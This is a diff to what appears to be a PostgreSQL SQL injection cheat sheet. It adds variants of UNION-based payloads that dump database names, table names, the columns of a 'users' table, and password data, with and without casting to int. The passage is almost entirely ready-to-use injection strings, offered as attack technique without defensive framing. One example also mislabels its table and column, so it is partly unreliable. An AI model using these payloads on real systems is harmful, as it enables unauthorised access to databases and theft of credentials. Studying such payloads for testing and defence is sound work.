@@ -261,19 +261,27 @@ Because the vulnerable column was **2**, simply replace the second *null* with t
 DIOS are complex queries and sometime they leads to errors, so using simpler queries to do specific dumping (like tables or columns) might be a better idea.
 
 ### Dump database names
-```'+union+select+cast(datname+as+int),null,null,null,null,null++FROM+pg_database--```
+```'+union+select+cast(datname+as+int),null,null,null,null,null++FROM+pg_database--```  
+or without casting to int:  
+```'+union+select+datname,null,null,null,null,null++FROM+pg_database--```
 
 ### Dump tables
 Let's assume that there are 4 columns in total and the first column is vulnerable. The following query can be used to dump all the tables:  
-```' union select cast(table_name as int), null, null, null FROM information_schema.tables--```
+```' union select cast(table_name as int), null, null, null FROM information_schema.tables--```  
+or without casting to int:  
+```' union select table_name, null, null, null FROM information_schema.tables--```
 
 ### Dump columns  
 You can only dump columns table per table (unless if you use DIOS which shows every columns of every table). In this case, we want to dump the columns of a table named **users**:  
-```union select cast(column_name as int), null, null, null FROM information_schema.columns WHERE table_name='users'--+```
+```union select cast(column_name as int), null, null, null FROM information_schema.columns WHERE table_name='users'--+```  
+or without casting to int:  
+```union select column_name, null, null, null FROM information_schema.columns WHERE table_name='users'--+```  
 
 ### Dump data  
 Assume that inside table **users** there is a column called **password**, let's dump that column:  
-```' union select cast(data_column as int), null, null, null FROM password--+```
+```' union select cast(data_column as int), null, null, null FROM password--+```  
+or without casting to int:  
+```' union select data_column, null, null, null FROM password--+```
 
 ### Dump PostgreSQL user's username & password hash  
 Let's assume that the database has 5 columns and the first one is vulnerable.   
